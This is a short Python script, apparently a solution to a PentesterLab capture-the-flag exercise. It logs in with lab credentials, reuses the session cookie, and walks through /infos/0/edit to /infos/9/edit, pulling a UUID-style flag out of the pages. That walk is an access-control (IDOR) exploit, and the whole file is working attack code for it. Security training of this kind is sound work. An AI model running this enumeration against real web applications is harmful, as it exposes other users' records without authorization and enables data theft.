import requests
import re
import sys

GREEN = "\033[32m"
RED = "\033[91m"
RESET = "\033[0m"

if len(sys.argv) != 2:
    print(f"{RED}[-] Please provide a URL{RESET}")
    sys.exit(1)
else:
    url = sys.argv[1]

user = "user1"
password = 'pentesterlab'
parameters = {'username': user, 'password': password, 'submit': 'Submit+Query'}
index = 0

login_request = requests.get(url + "/", params=parameters)

if login_request.status_code == 200:
    cookie = login_request.headers["Set-Cookie"].split(";")[0]
    while index < 10:
        print(f"[+] Checking page number {index}")
        flag_request = requests.get(url + "/infos/" + str(index) + "/edit", headers={"Cookie": cookie})
        try:
            flag = re.search(r"[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*", flag_request.text).group()
        except AttributeError:
            flag = re.search(r"[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*", flag_request.text)
        if flag:
            print(f"[+] The flag for this challenge is {GREEN}{flag}{RESET}")
            break
        index += 1
else:
    print(f"{RED}[-] Something went wrong!{RESET}")
